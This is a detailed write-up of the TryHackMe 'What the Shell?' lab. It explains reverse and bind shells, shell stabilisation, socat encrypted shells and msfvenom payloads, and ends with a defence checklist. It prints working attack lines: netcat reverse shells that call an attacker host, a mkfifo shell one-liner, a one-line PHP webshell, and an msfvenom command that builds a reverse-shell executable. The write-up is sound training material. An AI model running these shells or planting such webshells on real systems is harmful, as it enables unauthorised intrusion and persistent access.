## **🐚 TryHackMe — What the Shell? (Deep Dive, Detailed Walkthrough & Insights)**

Shells are one of the most fundamental building blocks in penetration testing and real-world exploitation. Almost every meaningful attack chain eventually leads to one thing: **remote command execution on a system**. Once that is achieved, an attacker can move from “outside the machine” to “inside the machine”.

This write-up expands the TryHackMe “What the Shell?” module into a **deep, step-by-step conceptual and practical guide**, explaining not just what tools do, but *why they work, how they are used in real attacks, and what defenders should understand about them*.

---

# **🧠 1\. What is a Shell (Deep Understanding)**

A **shell** is a program that allows a user to interact with an operating system by executing commands.

At the simplest level:

* You type a command  
* The system executes it  
* The output is returned

Examples:

* Linux: bash, sh, zsh  
* Windows: cmd.exe, PowerShell

But in cybersecurity, the meaning is more specific:

A **shell in exploitation context** is a remote command execution interface gained on a target machine.

This means:

* You are no longer locally typing commands  
* You are executing commands on another system  
* The communication happens over a network

---

# **🔁 2\. How Shells Are Created in Attacks**

Shells are not “given” directly. They are usually the result of:

### **🔓 Step 1: Initial vulnerability**

Examples:

* File upload vulnerability  
* Command injection  
* SQL injection (in rare cases leads to RCE)  
* Misconfigured services  
* Exploitable CMS or plugin

### **⚙️ Step 2: Code execution achieved**

Attacker gains ability to run commands like:

whoami  
id  
ls

### **🌐 Step 3: Shell is established**

Instead of single commands, attacker upgrades to:

* Reverse shell (most common)  
* Bind shell (less common)

---

# **🔥 3\. Reverse Shell vs Bind Shell (Critical Concept)**

## **🔁 Reverse Shell (Most Used in Real Attacks)**

### **Concept:**

The **target connects back to the attacker**

### **Why attackers prefer it:**

* Firewalls usually allow outbound connections  
* Easier to bypass restrictions  
* More reliable in real environments

### **Flow:**

Attacker: listens on port  
Target: connects back  
Result: shell session established

### **Example:**

Attacker machine:

nc \-lvnp 443

Target machine:

nc \<attacker-ip\> 443 \-e /bin/bash

### **What happens internally:**

* Target opens TCP connection to attacker  
* /bin/bash is attached to the network stream  
* Input/output flows through socket

---

## **🔵 Bind Shell**

### **Concept:**

The **target opens a port and waits**

### **Flow:**

Target: listens on port  
Attacker: connects to target

### **Example:**

Target:

nc \-lvnp 4444 \-e /bin/bash

Attacker:

nc \<target-ip\> 4444

### **Why it's less common:**

* Requires inbound port exposure  
* Firewalls often block it  
* Easier to detect

---

# **🛠️ 4\. Netcat (nc) — The Swiss Army Knife**

Netcat is one of the most important tools in networking and exploitation.

## **📌 Core uses:**

* Port listening  
* Manual TCP/UDP communication  
* Reverse shells  
* File transfer (basic)  
* Debugging network services

---

## **🔁 Reverse shell listener:**

nc \-lvnp 4444

### **Breakdown:**

* \-l → listen mode  
* \-v → verbose  
* \-n → no DNS lookup  
* \-p → port

---

## **⚠️ Important limitation:**

Many modern systems removed:

\-e /bin/bash

Because it is extremely dangerous.

---

# **🧪 5\. Shell Stabilisation (VERY IMPORTANT in real pentesting)**

Initial shells are usually:

* Broken  
* Missing arrow keys  
* No tab completion  
* No proper terminal behavior

---

## **🧬 Python stabilisation method (Linux)**

### **Step 1:**

python3 \-c 'import pty;pty.spawn("/bin/bash")'

### **What it does:**

* Spawns a pseudo-terminal  
* Converts raw shell into interactive bash

---

### **Step 2:**

export TERM=xterm

### **Why:**

* Enables terminal features like clear  
* Helps applications behave normally

---

### **Step 3:**

Press:

Ctrl \+ Z  
---

### **Step 4 (local machine):**

stty raw \-echo; fg

### **Effect:**

* Enables full keyboard control  
* Fixes Ctrl+C behavior  
* Restores interactive terminal

---

## **🧠 Insight:**

This is NOT just convenience — it prevents shell crashes during enumeration and privilege escalation.

---

# **⚡ 6\. rlwrap — Quick Shell Improvement**

rlwrap nc \-lvnp 4444

### **Benefits:**

* Arrow keys work  
* Command history works  
* Faster interaction

### **Limitation:**

* Not a full fix like Python method

---

# **🧪 7\. Socat — Advanced Shell Tool**

Socat is like Netcat but:

* More stable  
* More flexible  
* Supports encryption

---

## **Reverse shell listener:**

socat TCP-L:4444 \-  
---

## **Bind shell:**

socat TCP-L:4444 EXEC:"bash \-li"  
---

## **Why Socat matters:**

* Supports encryption (SSL shells)  
* Used in real-world red team ops  
* More reliable for complex environments

---

# **🔐 8\. Encrypted Shells (Important in Real Attacks)**

Example:

socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:\`tty\`,raw,echo=0

### **Why encryption matters:**

* Hides traffic from IDS/IPS  
* Avoids detection in enterprise networks  
* Mimics legitimate TLS traffic

---

# **🧬 9\. WebShells — Silent Persistent Access**

A **webshell** is a script uploaded to a web server that executes commands.

Example:

\<?php system($\_GET\['cmd'\]); ?\>  
---

## **Usage:**

http://target/uploads/shell.php?cmd=whoami  
---

## **Why webshells are dangerous:**

* Survive reboots  
* Easy to hide in web directories  
* Blend with normal web traffic  
* Provide long-term access

---

# **⚙️ 10\. msfvenom — Payload Generator**

msfvenom creates malicious payloads in many formats.

---

## **Example Windows payload:**

msfvenom \-p windows/x64/shell\_reverse\_tcp \-f exe \-o shell.exe LHOST=10.10.10.5 LPORT=443  
---

## **Breakdown:**

| Option | Meaning |
| ----- | ----- |
| \-p | payload type |
| \-f | output format |
| \-o | output file |
| LHOST | attacker IP |
| LPORT | listening port |

---

## **Payload types:**

### **Stageless:**

* Entire shell in one payload  
* Easier detection

### **Staged:**

* Small loader first  
* Downloads full payload later  
* Harder to detect

---

# **🎯 11\. Metasploit multi/handler**

Used to catch reverse shells.

---

## **Setup:**

msfconsole  
use multi/handler  
set PAYLOAD \<payload\>  
set LHOST \<ip\>  
set LPORT \<port\>  
exploit \-j  
---

## **Why \-j matters:**

* Runs in background  
* Allows multiple shells  
* Keeps session active

---

## **Managing sessions:**

session 1  
session 10  
---

# **💣 12\. Common Shell Payload Techniques**

---

## **Netcat reverse shell:**

mkfifo /tmp/f; nc \<ip\> \<port\> \< /tmp/f | /bin/sh \>/tmp/f 2\>&1; rm /tmp/f

### **Why it works:**

* FIFO pipe acts as buffer  
* Redirects input/output streams

---

## **PowerShell reverse shell (Windows):**

* Uses TCPClient  
* Streams data over socket  
* Executes commands dynamically

---

# **🧠 13\. Why Shells Are Unstable**

Because:

* No proper TTY allocation  
* Missing terminal drivers  
* Broken signal handling  
* No session management

---

# **🔐 14\. Defense Against Shell Attacks**

---

## **1\. Input validation**

Prevent injection vulnerabilities

---

## **2\. Disable dangerous functions**

* system()  
* exec()  
* shell\_exec()

---

## **3\. Network filtering**

* Block outbound traffic  
* Restrict unknown ports

---

## **4\. IDS/IPS monitoring**

Detect:

* reverse connections  
* suspicious ports (4444, 1337, 9001\)

---

## **5\. Patch vulnerabilities**

Most shell access comes from:

* outdated CMS  
* plugins  
* misconfigurations

---

# **🧩 15\. Real Attack Chain Example**

1. Discover vulnerable website  
2. Find file upload or injection flaw  
3. Inject payload:

    nc attacker-ip 4444 \-e /bin/bash

4. Receive reverse shell  
5. Stabilize shell  
6. Enumerate system  
7. Escalate privileges

---

# **🚀 16\. Key Takeaways**

* Shell \= remote command execution  
* Reverse shell \= target calls attacker (preferred)  
* Bind shell \= attacker connects to target  
* Netcat \= simplest shell tool  
* Socat \= advanced stable shell tool  
* msfvenom \= payload generator  
* Webshell \= persistent browser-based shell  
* Stabilisation \= essential for real exploitation

Task 3![][image1]  
Task 4  
![][image2]  
Task 5  
![][image3]  
Task 6  
![][image4]  
Task 7  
![][image5]  
Task 8  
![][image6]  
Task 9  
![][image7]  
Task 10  
![][image8]

[image1]: <data:image/png;base64,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